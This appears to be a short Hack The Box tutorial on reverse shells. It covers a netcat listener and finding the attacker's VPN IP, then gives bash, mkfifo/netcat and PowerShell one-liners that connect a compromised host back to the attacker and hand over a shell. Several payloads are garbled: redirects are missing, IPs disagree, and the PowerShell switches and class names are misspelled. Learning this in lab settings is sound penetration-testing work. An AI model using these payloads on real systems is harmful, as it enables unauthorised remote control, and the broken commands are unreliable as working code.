The first step is to start a netcat listener on a port of our choosing: 

$nc -lvnp 1234


-l  stands for listen mode , to wait for a connection to connect to us

-v	is for Verbose mode , so that we know when we receive a connection 

-n	Disable DNS resolution and ONLY connect from/to IPs , to speed up the connection 

-p 1234 Port number netcat is listening on , and the reverse connection should be sent to 

Now that  we have a netcat listener waiting for a connection , we can execute the reverse shell command that connects to us 

CONNECT BACK IP 

However, first we need to find our system's IP to send a reverse connection back to us. For finding the IP we can execute the following command

$ip a

We are connecting to the IP in tun0 because we can only connect to HTB through VPN,as the boxes doesn't have Internet connection. 
In a real pentest you may be directly connected to the same network , or performing and external penetration test, so you may connect through the "eth0"

REVERSE SHELL COMMAND 

The command we execute for establish a reverse connection depends widely on what operating system the compromised host runs , (Linux or Windows) and what applications and commands we can access.  The Payload All The Things page has a comprehensive list of reverse shell commands we can use that cover a wide range of options.
Certain reverse shell commands are more reliable than others and can usually be attempted to get a reverse connection.
The below commands are reliable commands we can use to get a reverse connection, for bash on Linux compromised hosts and Powershell on Windows compromised hosts: 

BASH 
$bash -c 'bash -i /dev/tcp/10.10.10.10/1234 0>&1'

$rm /tmp/f;mkfifo /tmp/f|/bin/sh -i 2>&1|nc 10.0.10.10 1234 >/tmp/f

POWERSHELL 
 
$powershell -NoP -NoNI -W Hidden -Exex Bypass -Command New-Object System.Net-Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

A Reverse Shell is handy when we want to get a quick ,reliable connection to our compromised host. However, a Reverse Shell can be very fragile.
Once the reverse shell command is stopped, or if we lose our connection for any reason , we would have to use the initial exploir to execute the reverse shell command again to regain our access. 

